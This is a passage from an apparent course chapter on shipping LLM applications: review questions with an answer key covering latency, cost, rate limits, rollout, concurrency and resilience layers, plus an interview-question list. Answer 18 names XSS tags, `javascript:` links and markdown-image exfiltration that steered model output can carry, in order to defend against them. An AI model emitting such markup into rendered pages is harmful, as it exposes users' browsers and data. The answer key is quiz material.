23. ([Part H](#part-h--concurrency--throughput-safe-output-rendering)) You're launching a feature where each provider call is a snappy 600ms but you expect 50 concurrent users. Explain why per-call latency tells you nothing about whether you'll survive, what you'd measure instead, and the two scopes (within-request, across-request) where you'd intervene.
24. ([Part I](#part-i--resilience-retries-timeouts-circuit-breakers-provider-fallback)) Design and *prove* the resilience layer for a provider call: name the four layers in order and what each fixes that the prior can't, explain why retries and the breaker **stack** rather than being alternatives, and describe the forced-failure test that demonstrates transient-retry, breaker-trips-fast, and graceful degradation.

**Answer key**
1. A key in client code is extractable by anyone (web/mobile) and lets them spend your money; the backend is also where prompt assembly, RAG, guardrails, logging, and rate-limiting must live. Client → backend → provider keeps the key and control server-side.
2. client → authenticate/rate-limit → input guardrails ([Chapter 7](07-evaluation.md)) → assemble prompt ([Chapter 3](03-prompt-engineering.md)) + retrieve ([Chapter 4](04-rag.md)) → provider call with retries ([Chapter 2](02-apis-and-integration.md)) → output guardrails ([Chapter 7](07-evaluation.md)) → log → respond. RAG slots in at context assembly; guardrails wrap the model call on both sides.
3. Synchronous for fast short calls; streaming for conversational/long output a human reads in real time; background job for long-running work (multi-step agents, batch) — return a job id, deliver later.
4. The provider call dominates. TTFT = time to first token (when output starts appearing); total latency = until the response is complete.
5. Output starts appearing almost immediately so the user reads as it generates instead of watching a spinner; the experience changes even though total generation time doesn't.
6. (input tokens × input price) + (output tokens × output price), per request × requests/day. A $0.02 request is $20k/month at 1M requests — small per-call cost × large volume = large bill; agents/RAG multiply input tokens.
7. Prompt caching (cheaper billing on a stable cached prefix), model tiering/routing (send easy requests to a cheaper model), shortening context (fewer tokens sent on every call); also batching (bulk discount for slower turnaround).
8. Requests-per-minute and tokens-per-minute caps; hitting them returns 429 Too Many Requests; respond with retry+backoff+jitter, a request queue with controlled concurrency, and backpressure.
9. A background/async job — accept the request, return a job id, deliver via polling/webhook/push (optionally stream progress). A synchronous endpoint would hold the connection ~40s and time out / block a worker.
10. Gate on offline eval, then canary/gradual rollout to a small % while watching the four live metrics, ramp if healthy; roll back instantly by flipping to the previous (versioned) prompt config.
11. Session/conversation state is stuck in one server instance's memory; with horizontal scaling the next request hits a different instance that lacks it. Fix: store session state in a shared store, not instance memory.
12. Re-running your eval set on model change catches the quality drop; prevention = pin specific model versions where possible and watch deprecation/update notices. The eval suite is the safeguard.
13. Logs record per-request tokens, cost, model, and prompt version; compare before/after the deploy to see if input tokens grew (e.g. more retrieved chunks / longer prompt), the model changed, or output ballooned — pinpointing the cause from data, not guesswork.
14. 429 → retry w/ backoff + queue + backpressure; timeout → per-call timeout + retry/fallback; 5xx transient → retry w/ backoff; provider outage → fallback to alternate model/provider, semantic-cache answer, or graceful degradation. Each provider failure has a pre-planned path so the feature degrades, not breaks.
15. Try in order: prompt caching (stable prefix), route easy traffic to a smaller model, trim/summarize context and retrieve fewer chunks, batch non-urgent work, semantic cache for stable repetitive questions. After each, re-run the eval set; if the quality metric drops below your bar, you've gone too far — back off that lever.
16. They're configuration that determines behavior and can be versioned, deployed, and reverted like code; that framing unlocks eval-gating before release, canary/gradual rollout behind metrics, A/B testing in prod, and instant rollback — none of which is possible if the prompt is an untracked string edited in place.
17. **Latency** = how long one request takes; it's dominated by the provider call and effectively fixed by the provider. **Throughput** = how many requests your service completes per unit time; you control it via concurrency (parallel fan-out within a request) and bounded concurrency sized to your RPM/TPM across requests.
18. Model output is text from an untrusted source (a prompt, tool result, or retrieved chunk can steer it), so you treat it like a stranger's comment — **UGC**. Rendering it raw lets emitted markup *act*: `<script>`/`<img onerror>` → **XSS** (attacker JS in the user's browser), a `javascript:` link, or an exfil markdown image. Sanitize/escape and allowlist-render at the boundary.
19. (1) **Timeout** — never hang a worker; (2) **retry with backoff+jitter** — capped, idempotent, for transient errors; (3) **circuit breaker** — after N failures it **trips/opens**, **fails fast** for a cooldown (returning immediately instead of calling the dead provider), then **half-opens** to probe recovery; (4) **fallback / graceful degradation**. Tripping = stop attempting the provider and short-circuit to the fallback.
20. Awaited in sequence the wall-clock is the **sum ≈ 1.8s**. Fan them out concurrently (`asyncio.gather` / thread pool) since they're independent, collapsing wall-clock to the **slowest leg ≈ max ≈ 0.6s** (~3× faster, identical work). Only calls that don't depend on each other can be parallelized.
21. Firing everything past the rate limit causes a **429 storm** — mass 429s, synchronized retries, re-stampede, goodput collapses. Fix: **bounded concurrency** — a **semaphore / worker pool** capping in-flight calls at N, with N sized to stay *under* your TPM/RPM (climbing 429s means *lower* N, not more workers). Retries still wrap each call for the occasional 429 that slips through.
22. Retries assume a *blip on one call*; a hard-down provider is a *sustained outage across calls*, so every request retries 3× against a dead endpoint, each waiting out its backoff — latency piles up and you DDoS your own dependency. The **circuit breaker** fixes it: after N failures it trips and **fails fast** to the fallback in ms instead of timing out for seconds per call.
23. Per-call latency measures one user's experience, not capacity: 50 concurrent users at, say, several calls each can blow past the provider's RPM/TPM even though each call is fast, so the service melts while latency looks fine. Measure **sustained requests/sec and tokens/sec** against your RPM/TPM. Intervene in two scopes: **within a request**, parallel-fan-out independent calls so wall-clock is the slowest leg; **across requests**, put provider calls behind a **bounded** semaphore/pool/queue sized to your TPM so concurrency stays under the limit instead of stampeding it.
24. Order: **timeout** (stop hanging a worker — but the call still fails) → **retry with backoff+jitter** (survive a transient blip — but a real outage becomes a retry-storm) → **circuit breaker** (stop the storm: trip after N failures, fail fast for a cooldown, half-open probe — but the user still needs an answer) → **fallback** (alternate model/provider, semantic-cache, or planned graceful degradation). Retries and the breaker **stack**, not alternatives: retries absorb the one-off blip, the breaker handles the sustained outage across calls. Prove it by pointing the call at a **stub (in Docker)** you can make 429, hang, or hard-down, then show (a) one transient 429 silently retried to success, (b) sustained outage trips the breaker → fail fast to the fallback in ms, (c) everything down → graceful-degradation response, each logged as a non-event.

**Deliverable:** wrap a prior build ([Chapter 4](04-rag.md) RAG or [Chapter 5](05-agents.md) agent) behind a small **API endpoint** that (a) keeps the key server-side, (b) **streams** responses, (c) **logs** prompt version + tokens + latency + cost per request, (d) has **retry + timeout + fallback** on the provider call, and (e) tags responses with a **prompt version** you can roll back. **Plus** a one-page *production-readiness writeup*: estimated monthly cost at a stated traffic level, your latency budget (TTFT target), the rollout + rollback plan, and which failure modes you've handled.

## Interview drill (self-test)
Real Gen-AI interview questions on today's material — *answer from memory, then check against what you just read.*

1. What is KV caching?
2. How do you reduce LLM latency?
3. How do you scale LLM inference?
4. What are CA scaling and clustering?
5. What is latency and throughput in LLMs?
6. Does Random Forest require feature scaling?
7. What are the steps to deploy an ML solution?
8. How to deploy Hugging Face models and where?
9. Which tools are used for monitoring in MLOps?
10. How do you monitor an ML model in production?
11. How to optimize inference speed in production?
12. How do you deploy an LLM application on Azure?
13. How to implement observability in terms of LLM?
14. What classical ML models have you productionized?
15. What is your experience with on-prem LLM deployment?

_(66 matched; 15 shown — more in [`ai-eng-questions.md`](../ai-eng-questions.md).)_

## Daily update
Send your one-liner: what you covered, what clicked, what's still fuzzy.
